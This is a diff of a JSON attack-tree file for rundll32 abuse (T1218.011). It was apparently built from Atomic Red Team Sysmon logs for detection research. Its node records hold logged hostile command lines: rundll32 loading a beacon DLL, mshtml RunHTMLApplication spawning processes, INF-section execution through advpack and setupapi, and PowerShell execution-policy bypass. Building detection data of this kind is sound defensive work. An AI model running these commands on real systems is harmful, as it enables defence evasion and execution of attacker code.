@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1218.011",
-  "generated_at_utc": "2026-05-08T15:44:09.596099+00:00",
+  "generated_at_utc": "2026-05-08T16:35:38.347465+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1218.011\\atomic_red_team\\ordinal_windows-sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1218.011\\atomic_red_team\\ordinal_windows-sysmon.log",
@@ -36,7 +36,9 @@
       "dfsrs.exe",
       "dfssvc.exe"
     ],
-    "core_effect": [],
+    "core_effect": [
+      "rundll32"
+    ],
     "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1218.011_malcious_config.json"
   },
   "matching": {
@@ -95,7 +97,61 @@
       "network:<private_ip>:80:tcp",
       "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp"
     ],
-    "core_effect_node_ids": [],
+    "core_effect_node_ids": [
+      "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:17",
+      "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:18",
+      "File:270f01aac4b93a9ba912504a0af346441a355d0e337da0987ab4d4d04284362a:17",
+      "File:6da22ed04c16469ceaa8b6ae5daf492b2fe18ba9b21e6c9e28452356c28dcb6d:17",
+      "File:94ee6edde723d77dfeed0d4f4849760a308fb2f308268f3382eca213f487742b:17",
+      "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
+      "File:cbd2a4cac80cab93231e14a78340c819db76eae89b2a64bf2a100729bbf346e6:17",
+      "Process:{1AADB668-6316-601C-710B-00000000A301}:1",
+      "Process:{1AADB668-6316-601C-710B-00000000A301}:10",
+      "Process:{834264DD-64E7-6206-E200-000000002802}:1",
+      "Process:{834264DD-64E7-6206-E300-000000002802}:1",
+      "Process:{834264DD-651A-6206-F200-000000002802}:1",
+      "Process:{834264DD-651A-6206-F300-000000002802}:1",
+      "Process:{834264DD-651B-6206-F500-000000002802}:1",
+      "Process:{834264DD-651B-6206-F700-000000002802}:1",
+      "Process:{9014E149-04AA-5FC5-EA00-000000009101}:1",
+      "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
+      "Process:{9014E149-04AA-5FC5-EB00-000000009101}:10",
+      "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
+      "Process:{9014E149-05D6-5FC5-5C01-000000009101}:1",
+      "Process:{9014E149-05D6-5FC5-5C01-000000009101}:10",
+      "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
+      "Process:{9014E149-0702-5FC5-D001-000000009101}:1",
+      "Process:{9014E149-0702-5FC5-D001-000000009101}:10",
+      "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D201-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D201-000000009101}:10",
+      "Process:{9014E149-0703-5FC5-D301-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D401-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D601-000000009101}:1",
+      "Process:{9014E149-0703-5FC5-D601-000000009101}:10",
+      "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
+      "Process:{D700CDCA-C071-6022-A5A1-00000000A301}:1",
+      "Process:{D700CDCA-C082-6022-A7A1-00000000A301}:1",
+      "Process:{D700CDCA-C094-6022-B1A1-00000000A301}:1",
+      "Process:{D700CDCA-C0BF-6022-B6A1-00000000A301}:1",
+      "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
+      "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
+      "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:10",
+      "Process:{D700CDCA-C0EE-6022-CBA1-00000000A301}:1",
+      "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
+      "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:10",
+      "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
+      "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
+      "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:10",
+      "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
+      "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
+      "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:10",
+      "network:151.101.12.133:443:tcp",
+      "network:93.184.220.29:80:tcp",
+      "network:<private_ip>:80:tcp",
+      "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp"
+    ],
     "whitelist_node_ids": [
       "File:01aae0cac7f8ba4a759b3d4c5000b8d8e44c2cc3a114a46de8b46a0e901a6ac2:11",
       "File:07290a063e914b3f1776cbdd59cc9ed5d56478b1a65f7da9c66f7e6f94c3298e:11",
@@ -600,969 +656,27 @@
   },
   "nodes": [
     {
-      "id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{834264DD-651A-6206-F200-000000002802}",
-        "pid": "6520",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll,#2 & rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll #2 & rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll, #2 <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
-        "command_hash": "82d629aa62f4ecde0d6b9f9da2983602dbd5ecdca46631308a07ac7e52c50056",
-        "event_id": "1",
-        "id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
-      "label": "cryptdll.dll",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%system32%\\cryptdll.dll",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "content_hash": "MD5=4B31902F1E0B79CE7E46D9877647C1CC,SHA256=8925892119315293C49D09A26191149660934BF1E5D3D023722E90339ADA38AA,IMPHASH=CAB6D6025DF08B0D0BC6259D625E2778",
-        "parent_process_id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
-        "event_id": "7",
-        "id": "File:ca3280538e8ac79e6aadc4c6293d022208d6cf312819009e7a420d3fb2567d49:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "cryptdll.dll",
-        "name": "cryptdll.dll"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:10",
+      "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:10",
       "label": "rundll32.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "rundll32.exe",
-        "guid": "{D700CDCA-C0E7-6022-CAA1-00000000A301}",
-        "pid": "6484",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1400 for rundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "85ea392028d0862089bd402029f31d85b2d39f8d2c21d762429dba4e3587bfd2",
-        "parent_process_id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-C0D1-6022-C4A1-00000000A301}",
-        "pid": "1204",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-CF05-6022-85A3-00000000A301}",
-        "pid": "1376",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  c:\\payloads\\beacon.dll,start <rundll32_abuse>",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C071-6022-A5A1-00000000A301}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{D700CDCA-C071-6022-A5A1-00000000A301}",
-        "pid": "2148",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c %windir%\\system32\\rundll32.exe c:\\payloads\\beacon.dll,start <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "e4080defdb022ab82da7c3dc706fdccf186a36ffeb759f00d070e5f643c24aa6",
-        "parent_process_id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C071-6022-A5A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04A8-5FC5-DF00-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-04A8-5FC5-DF00-000000009101}",
-        "pid": "4164",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe \\c powershell -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: powershell -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper>> <ps_bypass_flag>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "652ac8c278b2c241d78aad3cabdc0e7628243696c5ff8517d939cfd566d3d1f6",
-        "event_id": "1",
-        "id": "Process:{9014E149-04A8-5FC5-DF00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-BD16-6022-36A1-00000000A301}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-BD16-6022-36A1-00000000A301}",
-        "pid": "2076",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-BD16-6022-36A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe"
-      }
-    },
-    {
-      "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:18",
-      "label": "postex_456a",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "postex_456a",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
-        "event_id": "18",
-        "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:18",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "postex_456a",
-        "name": "postex_456a"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{9014E149-0448-5FC5-1500-000000009101}",
-        "pid": "1312",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-05D6-5FC5-5B01-000000009101}",
-        "pid": "4520",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\mshtml,runhtmlapplication \"+string(createobject(\"wscript.shell\").run(\"calc.exe\"),0) <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "bbdb8d420820ecb2c3152913343beaf52e919773ff8bae28fd4f2d4e19e15604",
-        "event_id": "1",
-        "id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "network:151.101.12.133:443:tcp",
-      "label": "151.101.12.133",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "151.101.12.133",
-        "destination_port": "443",
-        "protocol": "tcp",
-        "domain_name": "-",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
-        "event_id": "3",
-        "id": "network:151.101.12.133:443:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "151.101.12.133",
-        "name": "151.101.12.133"
-      }
-    },
-    {
-      "id": "File:cbd2a4cac80cab93231e14a78340c819db76eae89b2a64bf2a100729bbf346e6:17",
-      "label": "msse-4488-server",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "msse-4488-server",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
-        "event_id": "17",
-        "id": "File:cbd2a4cac80cab93231e14a78340c819db76eae89b2a64bf2a100729bbf346e6:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "msse-4488-server",
-        "name": "msse-4488-server"
-      }
-    },
-    {
-      "id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{834264DD-651B-6206-F700-000000002802}",
-        "pid": "5512",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll, #2 <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
-        "command_hash": "e43c5ed6f0599c1fd1c4e2a8e97d9ca6aa234e5c2343d86f560bc882787d65b0",
-        "event_id": "1",
-        "id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe",
-        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:10",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rundll32.exe",
-        "guid": "{D700CDCA-CFF8-6022-A4A3-00000000A301}",
-        "pid": "6696",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1410 for rundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "ee5b2826e86f42a0f8e00fcb9490ec82d071f72d3527607080702f782d1edddf",
-        "parent_process_id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{834264DD-651B-6206-F900-000000002802}:1",
-      "label": "windows calculator",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows calculator",
-        "guid": "{834264DD-651B-6206-F900-000000002802}",
-        "pid": "6760",
-        "image_path": "%system32%\\calc.exe",
-        "command_line": "%system32%\\calc.exe",
-        "original_file_name": "calc.exe",
-        "image_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
-        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
-        "parent_process_id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{834264DD-651B-6206-F900-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows calculator",
-        "name": "windows calculator"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{9014E149-04A9-5FC5-E500-000000009101}",
-        "pid": "1584",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell.exe\" -noninteractive <decoded_b64: [console]::inputencoding = new-object text.utf8encoding $false; import-module \"c:\\atomicredteam\\invoke-atomicredteam\\invoke-atomicredteam.psd1\" -force\ninvoke-atomictest \"t1218.011\" -confirm:$false -timeoutseconds 300 -executionlogpath c:\\atomicredteam\\atc_execution.csv> <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "638dd9b7d6ba9cb46158fc27957958add3a89d454c153f82b970e525220f13a5",
-        "event_id": "1",
-        "id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{9014E149-0703-5FC5-D201-000000009101}",
-        "pid": "2576",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  ieadvpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "11a1018e0db63ea972f2fb7cac507435cfd1737ea9c5438041b72a9cbe536410",
-        "parent_process_id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp",
-      "label": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
-        "destination_port": "",
-        "protocol": "tcp",
-        "domain_name": "raw.githubusercontent.com",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
-        "event_id": "22",
-        "id": "network:type:  5 github.map.fastly.net;::ffff:151.101.12.133;::tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;",
-        "name": "type:  5 github.map.fastly.net;::ffff:151.101.12.133;"
-      }
-    },
-    {
-      "id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{1AADB668-500B-601C-0309-00000000A301}",
-        "pid": "2712",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Process:{834264DD-64E7-6206-E300-000000002802}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{834264DD-64E7-6206-E300-000000002802}",
-        "pid": "5760",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll                                                                                                                                             #2blahblah",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
-        "command_hash": "cc29d6ccf69e1eed326bc77660aefe18c507866c42966f074854be56e62e6e80",
-        "parent_process_id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{834264DD-64E7-6206-E300-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{1AADB668-6316-601C-710B-00000000A301}",
-        "pid": "5416",
-        "image_path": "c:\\temp\\notrundll32.exe",
-        "command_line": "c:\\temp\\notrundll32.exe",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "8913e55494ea63dea235b184eba3c4e99aa1bef6e3130b41089203cd058ccbe6",
-        "parent_process_id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
         "guid": "{9014E149-0703-5FC5-D601-000000009101}",
         "pid": "3924",
         "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  setupapi.dll,installhinfsection defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "a09c60a0932a311a1b162d3f0a774fc00cbdad3ddd3b6f29bb8b20628db6c7e8",
-        "parent_process_id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{834264DD-64D6-6206-DA00-000000002802}",
-        "pid": "796",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for rundll32.exe",
         "original_file_name": "",
         "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{9014E149-0702-5FC5-D001-000000009101}",
-        "pid": "2868",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  advpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "b7079f540dc46a860c2fcc29dc3e78dca6f1201db9ee590d42959ab957f501fa",
-        "parent_process_id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
